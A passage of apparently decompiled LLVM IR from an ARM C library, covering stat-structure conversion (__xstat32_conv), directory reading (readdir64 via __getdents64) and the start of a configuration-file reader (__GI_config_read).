  %v1_1670c = add i32 %v0_1670c, 80
  %v1_16710 = inttoptr i32 %v1_1670c to i32*
  store i32 %v2_16704, i32* %v1_16710, align 4
  %v3_16710 = add i32 %v0_1670c, 84
  %v4_16710 = inttoptr i32 %v3_16710 to i32*
  %v5_16710 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16710, i32* %v4_16710, align 4
  %v0_16714 = load i32, i32* %r7.global-to-local, align 4
  %v1_16714 = load i32, i32* %r5.global-to-local, align 4
  %v2_16714 = add i32 %v1_16714, 48
  %v3_16714 = inttoptr i32 %v2_16714 to i32*
  store i32 %v0_16714, i32* %v3_16714, align 4
  %v0_16718 = load i32, i32* %r8.global-to-local, align 4
  %v1_16718 = load i32, i32* %r5.global-to-local, align 4
  %v2_16718 = add i32 %v1_16718, 52
  %v3_16718 = inttoptr i32 %v2_16718 to i32*
  store i32 %v0_16718, i32* %v3_16718, align 4
  %v0_1671c = load i32, i32* %r2.global-to-local, align 4
  %v1_1671c = load i32, i32* %r5.global-to-local, align 4
  %v2_1671c = add i32 %v1_1671c, 16
  %v3_1671c = inttoptr i32 %v2_1671c to i32*
  store i32 %v0_1671c, i32* %v3_1671c, align 4
  %v0_16720 = load i32, i32* %r6.global-to-local, align 4
  %v1_16720 = add i32 %v0_16720, 88
  store i32 %v1_16720, i32* %r3.global-to-local, align 4
  %v1_16724 = add i32 %v0_16720, 20
  %v2_16724 = inttoptr i32 %v1_16724 to i32*
  %v3_16724 = load i32, i32* %v2_16724, align 4
  store i32 %v3_16724, i32* %r2.global-to-local, align 4
  %v1_16728 = inttoptr i32 %v1_16720 to i32*
  %v2_16728 = load i32, i32* %v1_16728, align 4
  %v3_16728 = add i32 %v0_16720, 92
  %v4_16728 = inttoptr i32 %v3_16728 to i32*
  %v5_16728 = load i32, i32* %v4_16728, align 4
  store i32 %v5_16728, i32* %r1.global-to-local, align 4
  %v1_1672c = add i32 %v0_16720, 64
  store i32 %v1_1672c, i32* %r6.global-to-local, align 4
  %v1_16730 = inttoptr i32 %v1_1672c to i32*
  %v2_16730 = load i32, i32* %v1_16730, align 4
  store i32 %v2_16730, i32* %r6.global-to-local, align 4
  %v3_16730 = add i32 %v0_16720, 68
  %v4_16730 = inttoptr i32 %v3_16730 to i32*
  %v5_16730 = load i32, i32* %v4_16730, align 4
  store i32 %v5_16730, i32* %r7.global-to-local, align 4
  %v0_16734 = load i32, i32* %r5.global-to-local, align 4
  %v1_16734 = add i32 %v0_16734, 88
  store i32 %v1_16734, i32* %r3.global-to-local, align 4
  %v2_16738 = add i32 %v0_16734, 20
  %v3_16738 = inttoptr i32 %v2_16738 to i32*
  store i32 %v3_16724, i32* %v3_16738, align 4
  %v0_1673c = load i32, i32* %ip.global-to-local, align 4
  %v1_1673c = load i32, i32* %r5.global-to-local, align 4
  %v2_1673c = add i32 %v1_1673c, 24
  %v3_1673c = inttoptr i32 %v2_1673c to i32*
  store i32 %v0_1673c, i32* %v3_1673c, align 4
  %v0_16740 = load i32, i32* %lr.global-to-local, align 4
  %v1_16740 = load i32, i32* %r5.global-to-local, align 4
  %v2_16740 = add i32 %v1_16740, 28
  %v3_16740 = inttoptr i32 %v2_16740 to i32*
  store i32 %v0_16740, i32* %v3_16740, align 4
  %v0_16744 = load i32, i32* %r6.global-to-local, align 4
  %v1_16744 = load i32, i32* %r5.global-to-local, align 4
  %v2_16744 = add i32 %v1_16744, 64
  %v3_16744 = inttoptr i32 %v2_16744 to i32*
  store i32 %v0_16744, i32* %v3_16744, align 4
  %v0_16748 = load i32, i32* %r7.global-to-local, align 4
  %v1_16748 = load i32, i32* %r5.global-to-local, align 4
  %v2_16748 = add i32 %v1_16748, 68
  %v3_16748 = inttoptr i32 %v2_16748 to i32*
  store i32 %v0_16748, i32* %v3_16748, align 4
  %v0_1674c = load i32, i32* %r3.global-to-local, align 4
  %v1_1674c = inttoptr i32 %v0_1674c to i32*
  store i32 %v2_16728, i32* %v1_1674c, align 4
  %v3_1674c = add i32 %v0_1674c, 4
  %v4_1674c = inttoptr i32 %v3_1674c to i32*
  %v5_1674c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1674c, i32* %v4_1674c, align 4
  %v2_16750 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16750, i32* %r4.global-to-local, align 4
  ret i32 %v2_16728

; uselistorder directives
  uselistorder i32 %v0_16720, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_166f8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_16758 = load i32, i32* @r4, align 4
  store i32 %v3_16758, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_16770 = inttoptr i32 %arg2 to i8*
  %v4_16770 = call i32 @__GI_memset(i8* %v3_16770, i32 0, i32 88)
  %v2_16774 = load i32, i32* %arg1, align 4
  %v3_16774 = add i32 %tmp, 4
  %v4_16774 = inttoptr i32 %v3_16774 to i32*
  %v5_16774 = load i32, i32* %v4_16774, align 4
  store i32 %v5_16774, i32* %r4.global-to-local, align 4
  %v0_16778 = load i32, i32* %r6.global-to-local, align 4
  %v1_16778 = inttoptr i32 %v0_16778 to i32*
  store i32 %v2_16774, i32* %v1_16778, align 4
  %v3_16778 = add i32 %v0_16778, 4
  %v4_16778 = inttoptr i32 %v3_16778 to i32*
  %v5_16778 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16778, i32* %v4_16778, align 4
  %v0_1677c = load i32, i32* %r5.global-to-local, align 4
  %v1_1677c = add i32 %v0_1677c, 32
  %v1_16780 = inttoptr i32 %v1_1677c to i32*
  %v2_16780 = load i32, i32* %v1_16780, align 4
  %v3_16780 = add i32 %v0_1677c, 36
  %v4_16780 = inttoptr i32 %v3_16780 to i32*
  %v5_16780 = load i32, i32* %v4_16780, align 4
  store i32 %v5_16780, i32* %r4.global-to-local, align 4
  %v1_16784 = add i32 %v0_1677c, 96
  %v2_16784 = inttoptr i32 %v1_16784 to i32*
  %v3_16784 = load i32, i32* %v2_16784, align 4
  store i32 %v3_16784, i32* %r2.global-to-local, align 4
  %v1_16788 = load i32, i32* %r6.global-to-local, align 4
  %v2_16788 = add i32 %v1_16788, 32
  %v3_16788 = inttoptr i32 %v2_16788 to i32*
  store i32 %v2_16780, i32* %v3_16788, align 4
  %v0_1678c = load i32, i32* %r4.global-to-local, align 4
  %v1_1678c = load i32, i32* %r6.global-to-local, align 4
  %v2_1678c = add i32 %v1_1678c, 36
  %v3_1678c = inttoptr i32 %v2_1678c to i32*
  store i32 %v0_1678c, i32* %v3_1678c, align 4
  %v0_16790 = load i32, i32* %r2.global-to-local, align 4
  %v1_16790 = load i32, i32* %r6.global-to-local, align 4
  %v2_16790 = add i32 %v1_16790, 12
  %v3_16790 = inttoptr i32 %v2_16790 to i32*
  store i32 %v0_16790, i32* %v3_16790, align 4
  %v0_16794 = load i32, i32* %r5.global-to-local, align 4
  %v1_16794 = add i32 %v0_16794, 48
  %v2_16794 = inttoptr i32 %v1_16794 to i32*
  %v3_16794 = load i32, i32* %v2_16794, align 4
  %v1_16798 = add i32 %v0_16794, 24
  store i32 %v1_16798, i32* %ip.global-to-local, align 4
  %v1_1679c = inttoptr i32 %v1_16798 to i32*
  %v2_1679c = load i32, i32* %v1_1679c, align 4
  store i32 %v2_1679c, i32* %ip.global-to-local, align 4
  %v3_1679c = add i32 %v0_16794, 28
  %v4_1679c = inttoptr i32 %v3_1679c to i32*
  %v5_1679c = load i32, i32* %v4_1679c, align 4
  store i32 %v5_1679c, i32* %lr.global-to-local, align 4
  %v1_167a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_167a0 = add i32 %v1_167a0, 44
  %v3_167a0 = inttoptr i32 %v2_167a0 to i32*
  store i32 %v3_16794, i32* %v3_167a0, align 4
  %v0_167a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_167a4 = add i32 %v0_167a4, 64
  %v2_167a4 = inttoptr i32 %v1_167a4 to i32*
  %v3_167a4 = load i32, i32* %v2_167a4, align 4
  %v1_167a8 = add i32 %v0_167a4, 56
  %v2_167a8 = inttoptr i32 %v1_167a8 to i32*
  %v3_167a8 = load i32, i32* %v2_167a8, align 4
  store i32 %v3_167a8, i32* %r2.global-to-local, align 4
  %v1_167ac = load i32, i32* %r6.global-to-local, align 4
  %v2_167ac = add i32 %v1_167ac, 52
  %v3_167ac = inttoptr i32 %v2_167ac to i32*
  store i32 %v3_167a4, i32* %v3_167ac, align 4
  %v0_167b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_167b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_167b0 = add i32 %v1_167b0, 48
  %v3_167b0 = inttoptr i32 %v2_167b0 to i32*
  store i32 %v0_167b0, i32* %v3_167b0, align 4
  %v0_167b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_167b4 = add i32 %v0_167b4, 72
  %v1_167b8 = inttoptr i32 %v1_167b4 to i32*
  %v2_167b8 = load i32, i32* %v1_167b8, align 4
  %v3_167b8 = add i32 %v0_167b4, 76
  %v4_167b8 = inttoptr i32 %v3_167b8 to i32*
  %v5_167b8 = load i32, i32* %v4_167b8, align 4
  store i32 %v5_167b8, i32* %r1.global-to-local, align 4
  %v0_167bc = load i32, i32* %r6.global-to-local, align 4
  %v1_167bc = add i32 %v0_167bc, 56
  %v1_167c0 = inttoptr i32 %v1_167bc to i32*
  store i32 %v2_167b8, i32* %v1_167c0, align 4
  %v3_167c0 = add i32 %v0_167bc, 60
  %v4_167c0 = inttoptr i32 %v3_167c0 to i32*
  %v5_167c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_167c0, i32* %v4_167c0, align 4
  %v0_167c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_167c4 = add i32 %v0_167c4, 80
  %v1_167c8 = inttoptr i32 %v1_167c4 to i32*
  %v2_167c8 = load i32, i32* %v1_167c8, align 4
  %v3_167c8 = add i32 %v0_167c4, 84
  %v4_167c8 = inttoptr i32 %v3_167c8 to i32*
  %v5_167c8 = load i32, i32* %v4_167c8, align 4
  store i32 %v5_167c8, i32* %r1.global-to-local, align 4
  %v0_167cc = load i32, i32* %r6.global-to-local, align 4
  %v1_167cc = add i32 %v0_167cc, 64
  %v1_167d0 = inttoptr i32 %v1_167cc to i32*
  store i32 %v2_167c8, i32* %v1_167d0, align 4
  %v3_167d0 = add i32 %v0_167cc, 68
  %v4_167d0 = inttoptr i32 %v3_167d0 to i32*
  %v5_167d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_167d0, i32* %v4_167d0, align 4
  %v0_167d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_167d4 = add i32 %v0_167d4, 16
  %v2_167d4 = inttoptr i32 %v1_167d4 to i32*
  %v3_167d4 = load i32, i32* %v2_167d4, align 4
  %v1_167d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_167d8 = add i32 %v1_167d8, 16
  %v3_167d8 = inttoptr i32 %v2_167d8 to i32*
  store i32 %v3_167d4, i32* %v3_167d8, align 4
  %v0_167dc = load i32, i32* %r5.global-to-local, align 4
  %v1_167dc = add i32 %v0_167dc, 88
  %v1_167e0 = add i32 %v0_167dc, 20
  %v2_167e0 = inttoptr i32 %v1_167e0 to i32*
  %v3_167e0 = load i32, i32* %v2_167e0, align 4
  store i32 %v3_167e0, i32* %r2.global-to-local, align 4
  %v1_167e4 = inttoptr i32 %v1_167dc to i32*
  %v2_167e4 = load i32, i32* %v1_167e4, align 4
  %v3_167e4 = add i32 %v0_167dc, 92
  %v4_167e4 = inttoptr i32 %v3_167e4 to i32*
  %v5_167e4 = load i32, i32* %v4_167e4, align 4
  store i32 %v5_167e4, i32* %r1.global-to-local, align 4
  %v0_167e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_167e8 = add i32 %v0_167e8, 72
  %v1_167ec = inttoptr i32 %v1_167e8 to i32*
  store i32 %v2_167e4, i32* %v1_167ec, align 4
  %v3_167ec = add i32 %v0_167e8, 76
  %v4_167ec = inttoptr i32 %v3_167ec to i32*
  %v5_167ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_167ec, i32* %v4_167ec, align 4
  %v0_167f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_167f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_167f0 = add i32 %v1_167f0, 20
  %v3_167f0 = inttoptr i32 %v2_167f0 to i32*
  store i32 %v0_167f0, i32* %v3_167f0, align 4
  %v0_167f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_167f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_167f4 = add i32 %v1_167f4, 24
  %v3_167f4 = inttoptr i32 %v2_167f4 to i32*
  store i32 %v0_167f4, i32* %v3_167f4, align 4
  %v0_167f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_167f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_167f8 = add i32 %v1_167f8, 28
  %v3_167f8 = inttoptr i32 %v2_167f8 to i32*
  store i32 %v0_167f8, i32* %v3_167f8, align 4
  %v2_167fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_167fc, i32* %r4.global-to-local, align 4
  ret i32 %v2_167e4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 7, 3, 4, 1, 2, 0, 8, 9, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r6, align 4
  %v1_16818 = add i32 %tmp, 24
  store i32 %v1_16818, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_16830 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 112) to i32*), align 4
  store i32 %v4_16830, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16830)
  %v0_16844 = load i32, i32* @r6, align 4
  %v2_16844 = add i32 %v0_16844, 16
  %v3_16844 = inttoptr i32 %v2_16844 to i32*
  %v4_16844 = load i32, i32* %v3_16844, align 4
  store i32 %v4_16844, i32* %ip.global-to-local, align 4
  store i32 92240, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16844)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_16854

dec_label_pc_16854:                               ; preds = %dec_label_pc_16884, %entry
  %v0_16854 = load i32, i32* @r5, align 4
  %v1_16854 = add i32 %v0_16854, 4
  %v2_16854 = inttoptr i32 %v1_16854 to i32*
  %v3_16854 = load i32, i32* %v2_16854, align 4
  %v4_16854 = add i32 %v0_16854, 8
  %v5_16854 = inttoptr i32 %v4_16854 to i32*
  %v6_16854 = load i32, i32* %v5_16854, align 4
  %tmp10 = icmp ugt i32 %v6_16854, %v3_16854
  br i1 %tmp10, label %dec_label_pc_16884, label %dec_label_pc_16860

dec_label_pc_16860:                               ; preds = %dec_label_pc_16854
  %v1_16860 = inttoptr i32 %v0_16854 to i32*
  %v2_16860 = load i32, i32* %v1_16860, align 4
  %v1_16864 = add i32 %v0_16854, 12
  %v2_16864 = inttoptr i32 %v1_16864 to i32*
  %v3_16864 = load i32, i32* %v2_16864, align 4
  %v1_16868 = add i32 %v0_16854, 20
  %v2_16868 = inttoptr i32 %v1_16868 to i32*
  %v3_16868 = load i32, i32* %v2_16868, align 4
  %v4_1686c = inttoptr i32 %v3_16864 to i32*
  %v5_1686c = call i32 @__getdents64(i32 %v2_16860, i32* %v4_1686c, i32 %v3_16868, i32 %v6_16854)
  %tmp9 = icmp slt i32 %v5_1686c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_1687c

.thread:                                          ; preds = %dec_label_pc_16860
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_168b4

dec_label_pc_1687c:                               ; preds = %dec_label_pc_16860
  %v1_1687c = load i32, i32* @r5, align 4
  %v2_1687c = add i32 %v1_1687c, 8
  %v3_1687c = inttoptr i32 %v2_1687c to i32*
  store i32 %v5_1686c, i32* %v3_1687c, align 4
  %v0_16880 = load i32, i32* @r7, align 4
  %v1_16880 = load i32, i32* @r5, align 4
  %v2_16880 = add i32 %v1_16880, 4
  %v3_16880 = inttoptr i32 %v2_16880 to i32*
  store i32 %v0_16880, i32* %v3_16880, align 4
  %v0_16884.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16884

dec_label_pc_16884:                               ; preds = %dec_label_pc_16854, %dec_label_pc_1687c
  %v1_168a8 = phi i32 [ %v0_16854, %dec_label_pc_16854 ], [ %v0_16884.pre, %dec_label_pc_1687c ]
  %v1_16884 = add i32 %v1_168a8, 4
  %v2_16884 = inttoptr i32 %v1_16884 to i32*
  %v3_16884 = load i32, i32* %v2_16884, align 4
  %v1_16888 = add i32 %v1_168a8, 12
  %v2_16888 = inttoptr i32 %v1_16888 to i32*
  %v3_16888 = load i32, i32* %v2_16888, align 4
  %v2_1688c = add i32 %v3_16888, %v3_16884
  store i32 %v2_1688c, i32* @r4, align 4
  %v3_16890 = inttoptr i32 %v2_1688c to i32*
  %v4_16890 = load i32, i32* %v3_16890, align 4
  %v1_16894 = add i32 %v2_1688c, 4
  %v2_16894 = inttoptr i32 %v1_16894 to i32*
  %v3_16894 = load i32, i32* %v2_16894, align 4
  %v1_16898 = add i32 %v2_1688c, 16
  %v2_16898 = inttoptr i32 %v1_16898 to i16*
  %v3_16898 = load i16, i16* %v2_16898, align 2
  %v4_16898 = zext i16 %v3_16898 to i32
  %v1_1689c = add i32 %v2_1688c, 8
  %v2_1689c = inttoptr i32 %v1_1689c to i32*
  %v3_1689c = load i32, i32* %v2_1689c, align 4
  store i32 %v3_1689c, i32* %ip.global-to-local, align 4
  %v2_168a0 = add i32 %v4_16898, %v3_16884
  %v2_168a4 = or i32 %v3_16894, %v4_16890
  %v4_168a4 = icmp eq i32 %v2_168a4, 0
  store i32 %v2_168a0, i32* %v2_16884, align 4
  %v0_168ac = load i32, i32* %ip.global-to-local, align 4
  %v1_168ac = load i32, i32* @r5, align 4
  %v2_168ac = add i32 %v1_168ac, 16
  %v3_168ac = inttoptr i32 %v2_168ac to i32*
  store i32 %v0_168ac, i32* %v3_168ac, align 4
  br i1 %v4_168a4, label %dec_label_pc_16854, label %dec_label_pc_168b4

dec_label_pc_168b4:                               ; preds = %dec_label_pc_16884, %.thread
  %v0_168c0 = load i32, i32* @r6, align 4
  %v2_168c0 = add i32 %v0_168c0, 44
  %v3_168c0 = inttoptr i32 %v2_168c0 to i32*
  %v4_168c0 = load i32, i32* %v3_168c0, align 4
  store i32 %v4_168c0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_168c0)
  %v0_168cc = load i32, i32* @r4, align 4
  ret i32 %v0_168cc

; uselistorder directives
  uselistorder i32 %v2_1688c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_168a8, { 1, 0 }
  uselistorder i32 %v6_16854, { 1, 0 }
  uselistorder i32 %v0_16854, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_16884, { 1, 0 }
}

define i32 @function_168e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_168e0:
  %v0_168e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_168e0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_168e0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_168e0, %bb
  %v4_168ec = phi i32 [ %arg1, %dec_label_pc_168e0 ], [ 0, %bb ]
  ret i32 %v4_168ec

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_168f0 = load i32, i32* @r4, align 4
  %v6_168f0 = load i32, i32* @r5, align 4
  %v9_168f0 = load i32, i32* @r6, align 4
  %v12_168f0 = load i32, i32* @r7, align 4
  %v15_168f0 = load i32, i32* @r8, align 4
  %v18_168f0 = load i32, i32* @sb, align 4
  %v21_168f0 = load i32, i32* @sl, align 4
  %v24_168f0 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_168f4 = icmp eq i32* %arg1, null
  store i1 %v2_168f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_168f4, label %dec_label_pc_16c04, label %dec_label_pc_1690c

dec_label_pc_1690c:                               ; preds = %entry
  %v1_1690c = urem i32 %arg3, 256
  store i32 %v1_1690c, i32* @sb, align 4
  %v1_16910 = udiv i32 %arg3, 256
  %v3_16914 = urem i32 %v1_16910, 256
  %v3_16918 = mul nuw nsw i32 %v1_1690c, 4
  %v1_16920 = or i32 %v3_16918, 1
  %v1_1692c = and i32 %arg3, 131072
  %v1_16930 = add nsw i32 %v1_1690c, -1
  %v1_1693c = and i32 %arg3, 262144
  store i32 %v1_1693c, i32* %r2.global-to-local, align 4
  %v1_16940 = and i32 %arg3, 65536
  store i32 %v1_16940, i32* %r3.global-to-local, align 4
  store i32 %v1_16940, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_16950 = add i32 %arg4, 1
  store i32 %v1_16950, i32* @sl, align 4
  %v2_16ac8 = icmp eq i32 %v1_1692c, 0
  %v1_16b20 = inttoptr i32 %arg2 to i32*
  %v2_16b38 = icmp eq i32 %v1_1693c, 0
  br label %dec_label_pc_16954

dec_label_pc_16954:                               ; preds = %dec_label_pc_16954.backedge, %dec_label_pc_1690c
  %v2_16970 = phi i32 [ %v0_16954.pre, %dec_label_pc_16954.backedge ], [ %tmp, %dec_label_pc_1690c ]
  %v1_16954 = add i32 %v2_16970, 4
  %v2_16954 = inttoptr i32 %v1_16954 to i32*
  %v3_16954 = load i32, i32* %v2_16954, align 4
  store i32 %v3_16954, i32* %r3.global-to-local, align 4
  %v2_16958 = icmp eq i32 %v3_16954, 0
  store i1 %v2_16958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16958, label %dec_label_pc_16960, label %dec_label_pc_169a8

dec_label_pc_16960:                               ; preds = %dec_label_pc_16954
  %v1_16960 = add i32 %v2_16970, 16
  %v2_16960 = inttoptr i32 %v1_16960 to i32*
  %v3_16960 = load i32, i32* %v2_16960, align 4
  store i32 %v3_16960, i32* %r3.global-to-local, align 4
  %v2_16964 = icmp eq i32 %v3_16960, 0
  store i1 %v2_16964, i1* %cpsr_z.global-to-local, align 1
  %v1_16968 = add i32 %v2_16970, 8
  %v2_16968 = inttoptr i32 %v1_16968 to i32*
  %v3_16968 = load i32, i32* %v2_16968, align 4
  store i32 %v3_16968, i32* %r3.global-to-local, align 4
  br i1 %v2_16964, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_16960
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_16960, align 4
  %v0_16974.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_16960, %bb
  %v0_16974 = phi i32 [ %v0_16974.pre, %bb ], [ %v3_16968, %dec_label_pc_16960 ]
  %v2_16974 = icmp eq i32 %v0_16974, 0
  store i1 %v2_16974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16974, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_16920, i32* %r3.global-to-local, align 4
  %v2_1697c = load i32, i32* @r5, align 4
  %v3_1697c = add i32 %v2_1697c, 8
  %v4_1697c = inttoptr i32 %v3_1697c to i32*
  store i32 %v1_16920, i32* %v4_1697c, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_16980 = load i32, i32* @r5, align 4
  %v1_16980 = add i32 %v0_16980, 16
  %v2_16980 = inttoptr i32 %v1_16980 to i32*
  %v3_16980 = load i32, i32* %v2_16980, align 4
  store i32 %v3_16980, i32* %r0.global-to-local, align 4
  %v1_16984 = add i32 %v0_16980, 8
  %v2_16984 = inttoptr i32 %v1_16984 to i32*
  %v3_16984 = load i32, i32* %v2_16984, align 4
  store i32 %v3_16984, i32* %r3.global-to-local, align 4
  %v2_16988 = add i32 %v3_16984, %v3_16980
  store i32 %v2_16988, i32* @r0, align 4
  %v0_1698c = call i32 @malloc()
  store i32 %v0_1698c, i32* %r0.global-to-local, align 4
  %v2_16990 = icmp eq i32 %v0_1698c, 0
  store i1 %v2_16990, i1* %cpsr_z.global-to-local, align 1
  %v1_16994 = load i32, i32* @r5, align 4
  %v2_16994 = add i32 %v1_16994, 4
  %v3_16994 = inttoptr i32 %v2_16994 to i32*
  store i32 %v0_1698c, i32* %v3_16994, align 4
  br i1 %v2_16990, label %dec_label_pc_16c04, label %dec_label_pc_1699c

dec_label_pc_1699c:                               ; preds = %.thread
  %v0_1699c = load i32, i32* @r5, align 4
  %v1_1699c = add i32 %v0_1699c, 20
  %v2_1699c = inttoptr i32 %v1_1699c to i32*
  %v3_1699c = load i32, i32* %v2_1699c, align 4
  %v1_169a0 = or i32 %v3_1699c, 1
  store i32 %v1_169a0, i32* %r3.global-to-local, align 4
  store i32 %v1_169a0, i32* %v2_1699c, align 4
  %v0_169a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_169a8

dec_label_pc_169a8:                               ; preds = %dec_label_pc_16954, %dec_label_pc_1699c
  %v1_169b0 = phi i32 [ %v2_16970, %dec_label_pc_16954 ], [ %v0_169a8.pre, %dec_label_pc_1699c ]
  %v1_169a8 = add i32 %v1_169b0, 4
  %v2_169a8 = inttoptr i32 %v1_169a8 to i32*
  %v3_169a8 = load i32, i32* %v2_169a8, align 4
  store i32 %v3_169a8, i32* %r2.global-to-local, align 4
  %v4_169a8 = add i32 %v1_169b0, 8
  %v5_169a8 = inttoptr i32 %v4_169a8 to i32*
  %v6_169a8 = load i32, i32* %v5_169a8, align 4
  %v2_169ac = add i32 %v6_169a8, %v3_169a8
  store i32 %v2_169ac, i32* %r3.global-to-local, align 4
  %v2_169b0 = add i32 %v1_169b0, 12
  %v3_169b0 = inttoptr i32 %v2_169b0 to i32*
  store i32 %v2_169ac, i32* %v3_169b0, align 4
  %v0_169b4 = load i32, i32* @fp, align 4
  store i32 %v0_169b4, i32* @r6, align 4
  br label %dec_label_pc_169b8

dec_label_pc_169b8:                               ; preds = %dec_label_pc_16a44, %dec_label_pc_16a30, %dec_label_pc_169a8
  %v0_169c0 = phi i32 [ %v0_169b4, %dec_label_pc_169a8 ], [ %v1_16a30, %dec_label_pc_16a30 ], [ %v0_169c0.pre.pre, %dec_label_pc_16a44 ]
  %v0_169b8 = load i32, i32* @r5, align 4
  %v1_169b8 = add i32 %v0_169b8, 12
  store i32 %v1_169b8, i32* %r0.global-to-local, align 4
  %v1_169bc = inttoptr i32 %v1_169b8 to i32*
  %v2_169bc = load i32, i32* %v1_169bc, align 4
  store i32 %v2_169bc, i32* %r0.global-to-local, align 4
  %v3_169bc = add i32 %v0_169b8, 16
  %v4_169bc = inttoptr i32 %v3_169bc to i32*
  %v5_169bc = load i32, i32* %v4_169bc, align 4
  %v2_169c0 = add i32 %v2_169bc, %v0_169c0
  store i32 %v2_169c0, i32* %r0.global-to-local, align 4
  %v2_169c4 = sub i32 %v5_169bc, %v0_169c0
  %v1_169c8 = inttoptr i32 %v0_169b8 to i32*
  %v2_169c8 = load i32, i32* %v1_169c8, align 4
  store i32 %v2_169c8, i32* %r2.global-to-local, align 4
  %v3_169cc = call i32 @fgets(i32 %v2_169c0, i32 %v2_169c4, i32 %v2_169c8)
  store i32 %v3_169cc, i32* %r0.global-to-local, align 4
  store i32 %v3_169cc, i32* %r4.global-to-local, align 4
  %v2_169d0 = icmp eq i32 %v3_169cc, 0
  store i1 %v2_169d0, i1* %cpsr_z.global-to-local, align 1
  %v0_169d8 = load i32, i32* @r5, align 4
